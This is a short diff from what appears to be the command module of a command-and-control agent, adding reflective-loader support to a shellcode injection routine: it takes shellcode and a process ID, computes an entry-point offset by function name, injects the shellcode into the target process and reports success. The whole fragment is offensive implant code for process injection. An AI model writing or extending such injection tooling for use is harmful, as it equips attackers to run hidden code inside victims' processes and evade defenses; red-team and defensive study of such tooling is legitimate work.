@@ -21,6 +21,7 @@ namespace Agent.Commands
         {
             task.ThrowIfParameterMissing(ParameterId.File, $"ShellCode is mandatory!");
             task.ThrowIfParameterMissing(ParameterId.Id, $"ProcessId is mandatory!");
+            
 
             var shellcode = task.GetParameter(ParameterId.File);
 
@@ -35,7 +36,13 @@ namespace Agent.Commands
 
             try
             {
-                APIWrapper.Inject(process.Handle, IntPtr.Zero, shellcode, 0, context.ConfigService.APIInjectionMethod);
+                uint shellCodeOffset = 0;
+                if (task.HasParameter(ParameterId.Name))
+                {
+                    var entryPointFunctionName = task.GetParameter<string>(ParameterId.Name);
+                    shellCodeOffset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(shellcode, entryPointFunctionName);
+                }
+                APIWrapper.Inject(process.Handle, IntPtr.Zero, shellcode, shellCodeOffset, context.ConfigService.APIInjectionMethod);
 
                 context.AppendResult($"Injection succeed.");
             }
